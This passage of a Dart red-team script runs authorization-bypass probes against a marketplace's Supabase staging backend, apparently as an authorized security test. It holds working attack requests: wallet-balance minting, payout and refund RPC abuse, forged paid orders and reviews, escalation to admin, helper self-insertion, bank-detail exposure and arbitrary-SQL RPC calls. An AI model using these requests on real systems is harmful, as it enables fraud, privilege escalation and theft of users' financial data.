/// Red Team cego B — 20260829T1635
/// Descoberta livre em staging. Não corrige. Não toca produção.
/// service_role: setup / observação / cleanup apenas.
library;

import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260829T1635';
const stagingRef = 'fxdknzrqjenzqcvnwqqq';

final Map<String, dynamic> recon = {};
final List<Map<String, dynamic>> findings = [];
final List<Map<String, dynamic>> probes = [];
final List<String> cycles = [];
final List<String> gaps = [];
final List<String> coverage = [];

void note(String s) => stderr.writeln('[B $stamp] $s');

void probe(String id, String title, Map<String, dynamic> data) {
  probes.add({'id': id, 'title': title, ...data});
}

void finding({
  required String id,
  required String title,
  required String severity,
  required String actor,
  required String pre,
  required String request,
  required dynamic before,
  required dynamic result,
  required dynamic after,
  required String impact,
  required String repro,
}) {
  findings.add({
    'id': id,
    'title': title,
    'severity': severity,
    'actor': actor,
    'preconditions': pre,
    'request': request,
    'before': before,
    'result': result,
    'after': after,
    'impact': impact,
    'reproduction': repro,
  });
  note('FINDING $severity $id $title');
}

String clip(String s, [int n = 800]) {
  final t = s.replaceAll(RegExp(r'(eyJ[A-Za-z0-9_-]{20,}|sk_(test|live)_[A-Za-z0-9]+|whsec_[A-Za-z0-9]+)'), '[redacted]');
  if (t.length <= n) return t;
  return '${t.substring(0, n)}…';
}

Future<http.Response> rest(
  LiveOpsStagingClient c, {
  required String method,
  required String path,
  String? token,
  bool service = false,
  Object? body,
  Map<String, String>? extra,
}) async {
  final headers = <String, String>{
    'apikey': service ? c.serviceRoleKey : c.anonKey,
    'Authorization': 'Bearer ${service ? c.serviceRoleKey : (token ?? c.anonKey)}',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
    ...?extra,
  };
  final uri = Uri.parse('${c.url}$path');
  final encoded = body == null ? null : jsonEncode(body);
  switch (method) {
    case 'GET':
      return http.get(uri, headers: headers);
    case 'POST':
      return http.post(uri, headers: headers, body: encoded);
    case 'PATCH':
      return http.patch(uri, headers: headers, body: encoded);
    case 'DELETE':
      return http.delete(uri, headers: headers);
    case 'HEAD':
      return http.head(uri, headers: headers);
    default:
      throw ArgumentError(method);
  }
}

Future<http.Response> edge(
  LiveOpsStagingClient c,
  String fn, {
  String method = 'POST',
  String? token,
  Object? body,
  Map<String, String>? extra,
  String query = '',
}) {
  final headers = <String, String>{
    'apikey': c.anonKey,
    'Authorization': 'Bearer ${token ?? c.anonKey}',
    'Content-Type': 'application/json',
    ...?extra,
  };
  final uri = Uri.parse('${c.url}/functions/v1/$fn$query');
  if (method == 'GET') return http.get(uri, headers: headers);
  return http.post(uri, headers: headers, body: body == null ? null : jsonEncode(body));
}

dynamic tryJson(http.Response r) {
  try {
    return jsonDecode(r.body);
  } catch (_) {
    return clip(r.body, 400);
  }
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final client = LiveOpsStagingClient(
    url: normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL')),
    anonKey: envRequire(env, 'SUPABASE_ANON_KEY'),
    serviceRoleKey: envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY'),
  );
  if (!client.url.contains(stagingRef)) {
    stderr.writeln('ABORT: não é staging $stagingRef');
    exit(2);
  }

  recon['project'] = stagingRef;
  recon['frozen_at'] = DateTime.now().toUtc().toIso8601String();
  recon['stripe'] = 'TEST only (no live keys in actor path)';
  recon['production_touched'] = false;
  recon['fase4'] = false;

  note('sign-in buyer/seller');
  final buyerTok = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  final freshEmail =
      'rtb.b.${DateTime.now().millisecondsSinceEpoch}@fleaber.test';
  final freshPass = 'RtbB-${DateTime.now().millisecondsSinceEpoch}!aA1';
  String? freshId;
  String? freshTok;
  try {
    freshId = await client.createAdminUser(
      email: freshEmail,
      password: freshPass,
      userMetadata: {'user_type': 'comprador'},
    );
    freshTok = await client.signIn(email: freshEmail, password: freshPass);
    recon['fresh_user'] = {'id': freshId, 'email': freshEmail};
  } catch (e) {
    recon['fresh_user_error'] = e.toString();
    gaps.add('Não foi possível criar JWT fresco: $e');
  }

  await phase1Recon(client, buyerTok, sellerTok);
  await cycleFinancial(client, buyerTok, sellerTok, buyerId, sellerId, freshTok, freshId);
  await cycleSellerMalicious(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleBuyerMalicious(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleCollusion(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleIdentity(client, buyerTok, sellerTok, buyerId, sellerId, freshTok, freshId);
  await cyclePrivacy(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleStock(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleEdges(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleRaces(client, buyerTok, sellerTok, buyerId, sellerId);
  await cycleTemporalReputation(client, buyerTok, sellerTok, buyerId, sellerId);

  // Cleanup fixtures created by this run (service_role observation/cleanup).
  await cleanup(client, buyerId, sellerId);

  final outDir = Directory('tool/reports/redteam_blind_b_$stamp');
  outDir.createSync(recursive: true);
  File('tool/redteam_blind_b_$stamp.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(bundle()),
  );
  File('${outDir.path}/REDTEAM_BLIND_B_$stamp.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(bundle()),
  );
  File('REDTEAM_BLIND_B_$stamp.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(bundle()),
  );
  File('REDTEAM_BLIND_B_$stamp.md').writeAsStringSync(renderMd());
  File('${outDir.path}/REDTEAM_BLIND_B_$stamp.md').writeAsStringSync(renderMd());
  note('wrote REDTEAM_BLIND_B_$stamp.md / .json  findings=${findings.length}');
}

Map<String, dynamic> bundle() => {
      'meta': {
        'id': 'REDTEAM_BLIND_B_$stamp',
        'frozen_at': recon['frozen_at'],
        'project': stagingRef,
        'production_touched': false,
        'fase4': false,
      },
      'recon': recon,
      'cycles': cycles,
      'coverage': coverage,
      'gaps': gaps,
      'probes': probes,
      'findings': findings,
    };

Future<void> phase1Recon(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
) async {
  cycles.add('recon');
  note('Fase 1 recon');

  final anonOa = await http.get(
    Uri.parse('${c.url}/rest/v1/'),
    headers: {
      'apikey': c.anonKey,
      'Authorization': 'Bearer ${c.anonKey}',
      'Accept': 'application/openapi+json',
    },
  );
  final svcOa = await http.get(
    Uri.parse('${c.url}/rest/v1/'),
    headers: {
      'apikey': c.serviceRoleKey,
      'Authorization': 'Bearer ${c.serviceRoleKey}',
      'Accept': 'application/openapi+json',
    },
  );
  recon['openapi_anon'] = anonOa.statusCode;
  recon['openapi_service'] = svcOa.statusCode;

  List<String> paths = [];
  List<String> rpcs = [];
  if (svcOa.statusCode == 200) {
    try {
      final oa = jsonDecode(svcOa.body) as Map<String, dynamic>;
      final p = oa['paths'] as Map<String, dynamic>? ?? {};
      paths = p.keys.map((e) => e.toString()).toList()..sort();
      rpcs = paths.where((x) => x.startsWith('/rpc/')).toList();
      recon['rest_paths'] = paths.length;
      recon['rpc_paths'] = rpcs;
      recon['tables'] = paths.where((x) => !x.startsWith('/rpc/') && x != '/').toList();
    } catch (e) {
      recon['openapi_parse_error'] = e.toString();
    }
  }

  for (final name in ['run_sql_string', 'run_sql', 'exec_sql']) {
    final r = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/$name',
      service: true,
      body: {
        'sql':
            "select json_build_object('n', (select count(*) from information_schema.tables where table_schema='public'))",
      },
    );
    probe('recon.sql.$name', 'schema dump RPC $name', {
      'status': r.statusCode,
      'body': clip(r.body, 300),
    });
    if (r.statusCode < 400) {
      recon['schema_rpc'] = name;
      recon['schema_rpc_body'] = clip(r.body, 500);
    }
  }

  // Interesting tables via service (observe)
  for (final t in [
    'orders',
    'products',
    'wallets',
    'wallet_transactions',
    'live_tips',
    'lives',
    'live_items',
    'live_reservation_requests',
    'reviews',
    'order_disputes',
    'chats',
    'chat_messages',
    'profiles',
    'seller_helpers',
    'product_offers',
    'product_bundles',
    'stripe_checkout_events',
    'live_raffles',
    'live_raffle_winners',
    'live_raffle_tickets',
  ]) {
    try {
      final n = await c.countRows(t, serviceRole: true);
      recon['count_$t'] = n;
    } catch (e) {
      recon['count_$t'] = 'err ${clip(e.toString(), 120)}';
    }
  }

  coverage.add('OpenAPI anon=${anonOa.statusCode} service=${svcOa.statusCode} paths=${paths.length}');
}

Future<void> cycleFinancial(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
  String? freshTok,
  String? freshId,
) async {
  cycles.add('1-financeiro');
  note('ciclo financeiro');

  // Wallet INSERT mint
  if (freshTok != null && freshId != null) {
    final r = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/wallets',
      token: freshTok,
      body: {'id': freshId, 'balance': 99999.00},
    );
    final after = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/wallets?id=eq.$freshId&select=id,balance',
      service: true,
    );
    probe('fin.wallet.insert', 'JWT fresco INSERT wallet saldo 99999', {
      'status': r.statusCode,
      'body': clip(r.body),
      'after': clip(after.body, 300),
    });
    final rows = tryJson(after);
    num bal = 0;
    if (rows is List && rows.isNotEmpty) {
      bal = num.tryParse('${(rows.first as Map)['balance']}') ?? 0;
    }
    if (r.statusCode < 300 && bal >= 1000) {
      finding(
        id: 'RTB-B-FIN-01',
        title: 'INSERT wallet JWT cria saldo levantável',
        severity: 'P0',
        actor: 'JWT fresco',
        pre: 'Utilizador sem row em wallets',
        request: 'POST /wallets {id:self, balance:99999}',
        before: {'wallet': 'absent-or-zero'},
        result: {'http': r.statusCode, 'body': clip(r.body, 400)},
        after: {'balance': bal},
        impact: 'Criação líquida de dinheiro na carteira sem captura Stripe.',
        repro: 'Criar user, POST wallets com balance alto, verificar SELECT.',
      );
    }
  }

  // Wallet UPDATE balance
  final wUp = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/wallets?id=eq.$buyerId',
    token: buyerTok,
    body: {'balance': 88888.00},
  );
  probe('fin.wallet.patch', 'JWT PATCH wallets.balance', {
    'status': wUp.statusCode,
    'body': clip(wUp.body, 300),
  });

  // wallet_transactions INSERT
  final wt = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/wallet_transactions',
    token: buyerTok,
    body: {
      'wallet_id': buyerId,
      'amount': 500,
      'type': 'venda',
      'description': 'rtb-b',
    },
  );
  probe('fin.wt.insert', 'JWT INSERT wallet_transactions', {
    'status': wt.statusCode,
    'body': clip(wt.body, 300),
  });

  // Confused-deputy RPCs
  final rpcSpecs = <(String, Map<String, dynamic>)>[
    (
      'batata_wallet_apply_tip_once',
      {
        'p_wallet_id': buyerId,
        'p_tip_id': '00000000-0000-0000-0000-000000000001',
        'p_amount': 50,
        'p_type': 'gorjeta_recebida',
        'p_description': 'x',
      },
    ),
    (
      'batata_wallet_payout_debit',
      {
        'p_user_id': sellerId,
        'p_amount_cents': 100,
        'p_idempotency_key': 'rtb-b-$stamp',
      },
    ),
    (
      'batata_wallet_payout_finish',
      {
        'p_idempotency_key': 'rtb-b-$stamp',
        'p_transfer_id': 'tr_fake',
        'p_ok': true,
      },
    ),
    ('batata_ensure_wallet', {'p_user_id': sellerId}),
    (
      'batata_record_buyer_purchase_ledger',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_record_buyer_refund_ledger',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_release_seller_wallet_for_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_refund_buyer_wallet_for_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_process_partial_refund_dispute',
      {
        'p_order_id': '00000000-0000-0000-0000-000000000001',
        'p_refund_percent': 100,
      },
    ),
    ('batata_generate_auto_feedback', <String, dynamic>{}),
    (
      'batata_create_raffle_prize_order',
      {
        'p_raffle_id': '00000000-0000-0000-0000-000000000001',
        'p_winner_id': buyerId,
        'p_qty': 1,
      },
    ),
    (
      'batata_award_live_raffle_tickets',
      {
        'p_live_id': '00000000-0000-0000-0000-000000000001',
        'p_user_id': buyerId,
        'p_reason': 'share',
        'p_tickets': 10,
        'p_source': 'x',
        'p_meta': <String, dynamic>{},
      },
    ),
  ];
  for (final spec in rpcSpecs) {
    final name = spec.$1;
    final params = spec.$2;
    final r = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/$name',
      token: buyerTok,
      body: params,
    );
    probe('fin.rpc.$name', 'buyer JWT RPC $name', {
      'status': r.statusCode,
      'body': clip(r.body, 400),
    });
    if (r.statusCode == 200 &&
        name.contains('payout') &&
        r.body.contains('"ok":true')) {
      finding(
        id: 'RTB-B-FIN-02',
        title: 'payout debit/finish executável como buyer JWT',
        severity: 'P0',
        actor: 'buyer JWT',
        pre: 'conta buyer autenticada',
        request: 'POST /rpc/$name',
        before: {},
        result: clip(r.body, 400),
        after: {},
        impact: 'Débito/transferência de carteira alheia ou própria sem Edge.',
        repro: 'JWT buyer → RPC $name',
      );
    }
  }

  // Tip from wallet with seller_id = self / other live mismatch
  final tipSelf = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_send_live_tip_from_wallet',
    token: buyerTok,
    body: {
      'p_live_id': null,
      'p_seller_id': buyerId,
      'p_amount': 1,
      'p_message': 'self',
    },
  );
  probe('fin.tip.self', 'gorjeta wallet para si próprio', {
    'status': tipSelf.statusCode,
    'body': clip(tipSelf.body, 300),
  });

  final tipGhost = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_send_live_tip_from_wallet',
    token: buyerTok,
    body: {
      'p_live_id': null,
      'p_seller_id': sellerId,
      'p_amount': 1,
      'p_message': 'no-live',
    },
  );
  probe('fin.tip.nolive', 'gorjeta wallet sem live_id', {
    'status': tipGhost.statusCode,
    'body': clip(tipGhost.body, 300),
  });

  // live_tips INSERT completed
  final lt = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/live_tips',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 10,
      'seller_amount': 10,
      'processing_fee': 0,
      'status': 'completed',
      'payment_source': 'wallet',
    },
  );
  probe('fin.tips.insert', 'JWT INSERT live_tips completed', {
    'status': lt.statusCode,
    'body': clip(lt.body, 300),
  });

  // create-live-tip-checkout mutations
  for (final amt in [0, 0.01, -1, 1, 500.01, 999999, '1', null]) {
    final r = await edge(
      c,
      'create-live-tip-checkout',
      token: buyerTok,
      body: {'seller_id': sellerId, 'amount_eur': amt},
    );
    probe('fin.tip.edge.$amt', 'tip checkout amount=$amt', {
      'status': r.statusCode,
      'body': clip(r.body, 220),
    });
  }
  final tipCross = await edge(
    c,
    'create-live-tip-checkout',
    token: buyerTok,
    body: {
      'seller_id': buyerId,
      'amount_eur': 2,
      'live_id': '00000000-0000-0000-0000-000000000001',
    },
  );
  probe('fin.tip.edge.cross', 'tip checkout seller=self / live alheia', {
    'status': tipCross.statusCode,
    'body': clip(tipCross.body, 300),
  });

  // create-connect-account confused deputy
  final ca = await edge(
    c,
    'create-connect-account',
    token: buyerTok,
    body: {'user_id': sellerId, 'amount': 1},
  );
  probe('fin.connect.swap', 'payout user_id=seller com JWT buyer', {
    'status': ca.statusCode,
    'body': clip(ca.body, 300),
  });

  // payment-intent amount override / bag mutation
  final pi = await edge(
    c,
    'create-payment-intent',
    token: buyerTok,
    body: {
      'amount': 50,
      'currency': 'eur',
      'buyer_id': sellerId,
      'seller_id': buyerId,
      'quantity': -1,
      'item_price': 0.01,
      'shipping_method': 'hand',
    },
  );
  probe('fin.pi.mutate', 'create-payment-intent IDs cruzados / amount 50c', {
    'status': pi.statusCode,
    'body': clip(pi.body, 400),
  });
}

Future<Map<String, dynamic>?> fixtureProduct(
  LiveOpsStagingClient c,
  String sellerId, {
  int qty = 1,
  String title = 'RTB-B fixture',
}) async {
  try {
    return await c.insert('products', {
      'seller_id': sellerId,
      'title': '$title $stamp',
      'price': 4.20,
      'quantity': qty,
      'list_on_marketplace': true,
      'available_for_live': true,
    });
  } catch (e) {
    try {
      return await c.insert('products', {
        'seller_id': sellerId,
        'title': '$title $stamp',
        'price': 4.20,
        'list_on_marketplace': true,
      });
    } catch (e2) {
      gaps.add('fixture product: $e2');
      return null;
    }
  }
}

Future<void> cycleSellerMalicious(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('2-seller-malicioso');
  note('ciclo seller malicioso');

  final prod = await fixtureProduct(c, sellerId, title: 'RTB-B seller-order');
  if (prod == null) return;
  final pid = prod['id'].toString();

  // Seller cria encomenda para comprador que não pediu
  final ins = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: sellerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  probe('sel.order.ghost', 'seller INSERT order buyer=vítima payment=mbway', {
    'status': ins.statusCode,
    'body': clip(ins.body, 500),
  });

  String? oid;
  final insJson = tryJson(ins);
  if (insJson is List && insJson.isNotEmpty) {
    oid = (insJson.first as Map)['id']?.toString();
  } else if (insJson is Map) {
    oid = insJson['id']?.toString();
  }

  if (oid != null) {
    final before = await c.select('orders', filter: 'id=eq.$oid', limit: 1);
    final pay = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': 'pago'},
    );
    final after = await c.select(
      'orders',
      filter: 'id=eq.$oid',
      limit: 1,
    );
    probe('sel.order.mbway.pago', 'seller marca pago off-platform em order fantasma', {
      'status': pay.statusCode,
      'body': clip(pay.body, 400),
      'after_status': after.isEmpty ? null : after.first['status'],
      'amount_paid': after.isEmpty ? null : after.first['amount_paid_cents'],
    });

    final st = after.isEmpty ? '' : '${after.first['status']}'.toLowerCase();
    if (st == 'pago') {
      // Wallet mint?
      final w = await c.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
      final wt = await c.select(
        'wallet_transactions',
        filter: 'order_id=eq.$oid',
        limit: 20,
      );
      probe('sel.order.mbway.wallet', 'ledger após pago mbway fantasma', {
        'wallet': w,
        'tx': wt,
      });
      final minted = wt.any((t) {
        final typ = '${t['type']}'.toLowerCase();
        final amt = num.tryParse('${t['amount']}') ?? 0;
        return typ == 'venda' && amt > 0;
      });
      if (minted) {
        finding(
          id: 'RTB-B-FIN-03',
          title: 'Order fantasma MB WAY credita wallet sem captura',
          severity: 'P0',
          actor: 'seller JWT',
          pre: 'produto próprio; INSERT order com buyer alheio + mbway',
          request: 'PATCH orders status=pago',
          before: before,
          result: clip(pay.body, 400),
          after: {'order': after, 'wallet_tx': wt},
          impact: 'Criação de crédito de vendedor sem dinheiro na plataforma.',
          repro: 'Seller INSERT order buyer=vítima payment_method=mbway → PATCH pago.',
        );
      } else {
        // Still a fake paid order / stock / reputation path
        finding(
          id: 'RTB-B-ID-01',
          title: 'Seller fabrica encomenda paga (MB WAY) para buyer alheio',
          severity: 'P1',
          actor: 'seller JWT',
          pre: 'produto próprio',
          request: 'POST orders {buyer_id:vítima, payment_method:mbway} + PATCH pago',
          before: {},
          result: {'http_insert': ins.statusCode, 'http_pago': pay.statusCode, 'status': st},
          after: after,
          impact:
              'Vítima fica com encomenda que não fez; stock/reputação/review podem seguir o estado pago.',
          repro: 'JWT seller INSERT order com buyer_id alheio e marcar pago off-platform.',
        );
      }
    }

    // Reviews on ghost paid order
    final rev = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/reviews',
      token: sellerTok,
      body: {
        'order_id': oid,
        'target_id': buyerId,
        'buyer_id': sellerId,
        'stars': 1,
        'comment': 'rtb-b ghost',
        'author_role': 'vendedor',
        'target_type': 'buyer',
      },
    );
    probe('sel.review.ghost', 'review 1★ do seller sobre buyer em order fantasma', {
      'status': rev.statusCode,
      'body': clip(rev.body, 400),
    });
    if (rev.statusCode < 300) {
      finding(
        id: 'RTB-B-REP-01',
        title: 'Review negativa sobre buyer sem compra real',
        severity: 'P1',
        actor: 'seller JWT',
        pre: 'order fantasma pago (MB WAY)',
        request: 'POST reviews author_role=vendedor target=buyer',
        before: {},
        result: clip(rev.body, 400),
        after: {},
        impact: 'Reputação do comprador danificada sem transacção consentida.',
        repro: 'Fabricar order + review como vendedor.',
      );
    }
  }

  // user_type → admin
  final ut = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/profiles?id=eq.$sellerId',
    token: sellerTok,
    body: {'user_type': 'admin'},
  );
  probe('sel.profile.admin', 'seller PATCH user_type=admin', {
    'status': ut.statusCode,
    'body': clip(ut.body, 300),
  });

  // IBAN of others via profiles *
  final prof = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/profiles?id=eq.$buyerId&select=*',
    token: sellerTok,
  );
  probe('sel.profile.star', 'seller SELECT profiles.* do buyer', {
    'status': prof.statusCode,
    'body': clip(prof.body, 500),
  });

  // live_items qty inflation
  final lives = await c.select('lives', filter: 'seller_id=eq.$sellerId', limit: 3);
  recon['seller_lives'] = lives.map((e) => e['id']).toList();
}

Future<void> cycleBuyerMalicious(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('3-buyer-malicioso');
  note('ciclo buyer malicioso');

  final prod = await fixtureProduct(c, sellerId, title: 'RTB-B buyer-order');
  if (prod == null) return;
  final pid = prod['id'].toString();

  // Buyer INSERT already-paid
  final paid = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pago',
      'price_total': 1,
      'quantity': 1,
      'payment_method': 'stripe',
      'amount_paid_cents': 10000,
    },
  );
  probe('buy.order.paid.insert', 'buyer INSERT status=pago amount_paid_cents', {
    'status': paid.statusCode,
    'body': clip(paid.body, 400),
  });

  // Buyer INSERT premio_rifa
  final prize = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'premio_rifa',
      'price_total': 0,
      'quantity': 1,
      'payment_method': 'stripe',
    },
  );
  probe('buy.order.prize', 'buyer INSERT premio_rifa', {
    'status': prize.statusCode,
    'body': clip(prize.body, 400),
  });

  // Self-accept: buyer is also... can't be seller of this product.
  // Buyer PATCH status concluido on unpaid
  final pend = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'stripe',
    },
  );
  probe('buy.order.pend', 'buyer INSERT pendente', {
    'status': pend.statusCode,
    'body': clip(pend.body, 400),
  });
  String? oid;
  final pj = tryJson(pend);
  if (pj is List && pj.isNotEmpty) oid = (pj.first as Map)['id']?.toString();
  if (pj is Map) oid = pj['id']?.toString();
  if (oid != null) {
    for (final st in [
      'pago',
      'enviado',
      'concluido',
      'aguarda_confirmacao',
      'reservado',
    ]) {
      final r = await rest(
        c,
        method: 'PATCH',
        path: '/rest/v1/orders?id=eq.$oid',
        token: buyerTok,
        body: {'status': st},
      );
      probe('buy.patch.$st', 'buyer PATCH status=$st', {
        'status': r.statusCode,
        'body': clip(r.body, 250),
      });
    }
    // checkout with mutated bag
    final chk = await edge(
      c,
      'create-payment-intent',
      token: buyerTok,
      body: {
        'order_id': oid,
        'shipping_method': 'hand',
        'amount': 50,
        'bag_checkout': true,
        'bag_lines': [
          {
            'order_id': oid,
            'product_id': pid,
            'seller_id': sellerId,
            'quantity': 99,
            'line_total_cents': 50,
          },
        ],
      },
    );
    probe('buy.checkout.bagmutate', 'checkout bag qty 99 / amount 50c', {
      'status': chk.statusCode,
      'body': clip(chk.body, 500),
    });

    final ref = await edge(
      c,
      'refund-order',
      token: buyerTok,
      body: {'order_id': oid},
    );
    probe('buy.refund.unpaid', 'buyer refund-order em unpaid', {
      'status': ref.statusCode,
      'body': clip(ref.body, 300),
    });
  }

  // Helper self-insert
  final help = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/seller_helpers',
    token: buyerTok,
    body: {
      'seller_id': sellerId,
      'helper_user_id': buyerId,
      'invited_by': buyerId,
      'display_name': 'pwn',
      'active': true,
      'invitation_status': 'accepted',
      'permissions': {
        'can_manage_reservations': true,
        'can_view_live_dashboard': true,
      },
    },
  );
  probe('buy.helper.self', 'buyer INSERT seller_helpers na loja alheia', {
    'status': help.statusCode,
    'body': clip(help.body, 300),
  });
  if (help.statusCode < 300) {
    finding(
      id: 'RTB-B-AUTH-01',
      title: 'Buyer auto-nomeia-se helper com permissões de reservas',
      severity: 'P1',
      actor: 'buyer JWT',
      pre: 'conhecer seller_id',
      request: 'POST seller_helpers accepted + can_manage_reservations',
      before: {},
      result: clip(help.body, 400),
      after: {},
      impact: 'Autoridade de staff sobre loja alheia (reservas/stock live).',
      repro: 'JWT buyer INSERT seller_helpers com seller_id alheio.',
    );
  }
}

Future<void> cycleCollusion(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('4-collusion');
  note('ciclo collusion buyer+seller');

  final prod = await fixtureProduct(c, sellerId, qty: 1, title: 'RTB-B collude');
  if (prod == null) return;
  final pid = prod['id'].toString();

  final ins = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 99.00,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  String? oid;
  final j = tryJson(ins);
  if (j is List && j.isNotEmpty) oid = (j.first as Map)['id']?.toString();
  if (j is Map) oid = j['id']?.toString();
  probe('col.order', 'collusion create mbway order', {
    'status': ins.statusCode,
    'oid': oid,
    'body': clip(ins.body, 300),
  });
  if (oid == null) return;

  final pago = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: sellerTok,
    body: {'status': 'pago'},
  );
  final afterPago = await c.select('orders', filter: 'id=eq.$oid', limit: 1);
  probe('col.pago', 'seller confirma MB WAY', {
    'status': pago.statusCode,
    'order': afterPago,
  });

  final env = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: sellerTok,
    body: {'status': 'enviado'},
  );
  final conc = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: buyerTok,
    body: {'status': 'concluido'},
  );
  probe('col.logistics', 'enviado→concluido sem Stripe', {
    'enviado': env.statusCode,
    'concluido': conc.statusCode,
    'env_body': clip(env.body, 200),
    'conc_body': clip(conc.body, 200),
  });

  final rel = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_release_seller_wallet_for_order',
    token: buyerTok,
    body: {'p_order_id': oid},
  );
  final w = await c.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  final tx = await c.select(
    'wallet_transactions',
    filter: 'order_id=eq.$oid',
    limit: 20,
  );
  probe('col.release', 'buyer chama release wallet após concluido MB WAY', {
    'rpc': rel.statusCode,
    'body': clip(rel.body, 300),
    'wallet': w,
    'tx': tx,
  });
  final saleCredit = tx.where((t) => '${t['type']}' == 'venda');
  if (saleCredit.isNotEmpty) {
    finding(
      id: 'RTB-B-FIN-04',
      title: 'Collusion MB WAY → concluido → crédito wallet',
      severity: 'P0',
      actor: 'buyer+seller',
      pre: 'order mbway confirmada pelo seller',
      request: 'RPC batata_release_seller_wallet_for_order',
      before: {},
      result: clip(rel.body, 400),
      after: {'tx': tx, 'wallet': w},
      impact: 'Dinheiro de carteira sem captura Stripe.',
      repro: 'Criar order mbway, seller pago, logistics, RPC release.',
    );
  }

  // banking oracle on aguarda / reservado / pendente
  for (final st in ['pendente', 'reservado', 'aguarda_confirmacao', 'pago']) {
    await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': st},
    );
    final bank = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/batata_seller_direct_payment_details',
      token: buyerTok,
      body: {'p_seller_id': sellerId},
    );
    probe('col.bank.$st', 'IBAN RPC com order status=$st', {
      'status': bank.statusCode,
      'body': clip(bank.body, 300),
    });
    final b = tryJson(bank);
    if (bank.statusCode == 200 &&
        b is List &&
        b.isNotEmpty &&
        ((b.first as Map)['iban'] != null || (b.first as Map)['mb_way'] != null)) {
      if (st != 'pago' && st != 'aguarda_confirmacao') {
        finding(
          id: 'RTB-B-PRIV-01',
          title: 'IBAN/MB WAY revelado em estado não autorizado ($st)',
          severity: 'P1',
          actor: 'buyer JWT',
          pre: 'order entre as partes com status $st',
          request: 'RPC batata_seller_direct_payment_details',
          before: {'status': st},
          result: clip(bank.body, 300),
          after: {},
          impact: 'Dados bancários do vendedor antes de haver acordo de pagamento directo.',
          repro: 'Ter order $st e chamar o RPC.',
        );
      }
    }
  }
}

Future<void> cycleIdentity(
